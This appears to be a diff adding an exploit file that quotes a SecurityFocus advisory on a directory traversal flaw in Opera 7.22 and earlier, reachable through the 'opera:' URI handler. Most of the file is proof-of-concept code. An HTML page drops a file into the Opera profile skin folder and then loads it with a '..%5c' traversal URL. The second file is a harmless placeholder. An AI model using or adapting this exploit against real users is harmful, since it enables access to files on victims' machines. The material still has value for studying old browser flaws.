@@ -1,0 +1,60 @@
+source: http://www.securityfocus.com/bid/9021/info
+
+It has been reported that Opera is vulnerable to a directory traversal issue that may allow an attacker to access sensitive information. The problem presents itself due to insufficient sanitization of user-supplied data through the 'Opera:' URI handler. The issue may allow an attacker to traverse outside a directory by using '..%5c' or '..%2f' character sequences.
+
+Successful exploitation of this vulnerability may allow a remote attacker to gain access to sensitive information that may be used to launch further attacks against a vulnerable system.
+
+Opera Web Browser versions 7.22 and prior are reported to be prone to this issue.
+
+---------------START MAIN.HTM----------------
+
+
+<html>
+
+<head>
+
+<script language="javascript">
+
+var win=open("skin.htm") // The server should return content-type as // "application/x-opera-skin" for "Skin.htm". "Skin.htm" will be dropped in the
+"<opera // dir>/profile/skin/" folder.
+
+setTimeout("redir()",2000) //modify according to your situation.
+
+
+function redir(){
+
+window.location.href="opera:/help/..%5c/profile/skin/skin.htm" //This uses the // directory traversal flaw mentioned in advisory 2 to get the path of the
+dropped file. In this // case, it is skin.htm.
+
+}
+
+
+</script>
+
+</head>
+
+
+<body>
+
+<h1>This is the main file</h1>
+
+</body>
+
+</html>
+
+
+
+---------------END MAIN.HTM----------------
+
+
+---------------START SKIN.HTM----------------
+
+
+<body>
+
+<h1> Opera Skinned!!! </h1><p>This is Skin.htm from "<opera dir>/profile/skin/" in localhost.
+
+</body>
+
+
+---------------END SKIN.HTM---------------- 
